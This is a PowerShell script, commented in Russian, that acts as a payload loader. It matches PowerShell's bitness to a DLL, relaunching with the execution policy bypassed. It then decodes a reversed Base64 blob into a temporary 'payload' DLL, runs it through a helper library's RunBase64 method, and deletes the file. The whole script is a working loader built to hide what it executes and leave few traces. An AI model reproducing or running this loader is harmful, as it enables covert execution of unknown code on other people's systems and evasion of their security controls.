﻿# 1.ps1 — автоподбор битности PowerShell под DLL

$ErrorActionPreference = 'Stop'

function Get-PEArch {
    param([byte[]]$Bytes)
    if ($Bytes.Length -lt 0x100) { return "unknown" }
    if ($Bytes[0] -ne 0x4D -or $Bytes[1] -ne 0x5A) { return "unknown" } # 'MZ'
    $e_lfanew = [BitConverter]::ToInt32($Bytes, 0x3C)
    if ($e_lfanew -lt 0 -or ($e_lfanew + 0x18) -ge $Bytes.Length) { return "unknown" }
    if ($Bytes[$e_lfanew] -ne 0x50 -or $Bytes[$e_lfanew+1] -ne 0x45) { return "unknown" } # 'PE'
    $magic = [BitConverter]::ToUInt16($Bytes, $e_lfanew + 0x18)
    switch ($magic) {
        0x10B { return "x86" }
        0x20B { return "x64" }
        default { return "unknown" }
    }
}

# === 1) Определяем архитектуру DLL ===
$dllPath = (Resolve-Path ".\Company.SafeIngest.dll").Path
$dllBytes = [System.IO.File]::ReadAllBytes($dllPath)
$dllArch = Get-PEArch $dllBytes
$is64 = [Environment]::Is64BitProcess

if ($dllArch -eq "x86" -and $is64) {
    Write-Host "⚠ DLL is x86, current PowerShell is x64 — restarting in x86..."
    $ps32 = "$env:WINDIR\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    if (-not (Test-Path $ps32)) { throw "Cannot find 32-bit PowerShell at $ps32" }
    & $ps32 -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath
    exit
}
elseif ($dllArch -eq "x64" -and -not $is64) {
    Write-Host "⚠ DLL is x64, current PowerShell is x86 — restarting in x64..."
    $ps64 = "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
    if (-not (Test-Path $ps64)) { throw "Cannot find 64-bit PowerShell at $ps64" }
    & $ps64 -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath
    exit
}

if ($is64) { $psArch = "x64" } else { $psArch = "x86" }
Write-Host "✅ Architecture OK: DLL=$dllArch, PowerShell=$psArch"

# === 2) Читаем и разворачиваем Base64 ===
$base64Path = (Resolve-Path ".\base64.txt").Path
$raw = Get-Content -Raw -Path $base64Path
$chars = $raw.ToCharArray()
[Array]::Reverse($chars)
$fixedBase64 = -join $chars
$bytes = [Convert]::FromBase64String($fixedBase64)

# === 3) Временный файл для payload ===
$tempDll = Join-Path $env:TEMP ("payload_" + [guid]::NewGuid().ToString("N") + ".dll")
[System.IO.File]::WriteAllBytes($tempDll, $bytes)

try {
    Add-Type -Path $dllPath -ErrorAction Stop
    $instance = New-Object Company.SafeIngest.SafeIngest
    $instance.RunBase64([Convert]::ToBase64String([IO.File]::ReadAllBytes($tempDll)))
    Write-Host "✅ Payload executed successfully."
}
finally {
    Remove-Item $tempDll -ErrorAction SilentlyContinue
}
